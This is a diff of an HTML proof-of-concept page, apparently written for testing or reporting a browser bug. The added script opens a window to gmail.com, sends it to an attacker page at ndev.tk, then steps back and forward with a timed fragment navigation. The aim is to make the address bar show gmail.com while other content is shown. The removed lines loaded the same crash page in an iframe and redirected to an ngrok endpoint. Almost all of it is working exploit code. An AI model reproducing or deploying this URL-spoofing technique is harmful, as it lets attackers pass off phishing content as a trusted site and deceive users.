@@ -1,28 +1,20 @@
-<!DOCTYPE html>
-<body>
-
-<button onclick="launchPage()">Click Me</button>
-
 <script>
-function launchPage() {
-    const frame = document.createElement("iframe");
+var w = null;
+function spoof() {
+  w = window.open("about:blank");
 
-    frame.src = "https://ndev.tk/crashself.html";
-    frame.width = "100%";
-    frame.height = "400";
-    frame.style.border = "1px solid #ccc";
+  // Step 1: Load victim page.
+  w.location = "http://www.gmail.com";
 
-    document.body.appendChild(frame);
+  // Step 2: Navigate to attacker's page.
+  setTimeout('w.location = "https://ndev.tk/crashself.html"', 1000);
 
-    setTimeout(() => {
-        window.location.href =
-          "https://5c57-2402-8780-1052-4f26-8db1-c95e-bf20-c28f.ngrok-free.app/returns-204";
-    }, 2000);
+  // Step 3: Go back.
+  setTimeout('w.history.back();', 2000);
+
+  // Step 4: Go forward, but interrupt with a quick fragment navigation.
+  setTimeout('w.history.forward(); setTimeout("w.location = \'http://www.gmail.com#URLspoof\'", 1);', 3000);
 }
 </script>
 
-</body>
-</html>
-
-</body>
-</html>
+<a href="javascript:spoof();">Click Me</a>
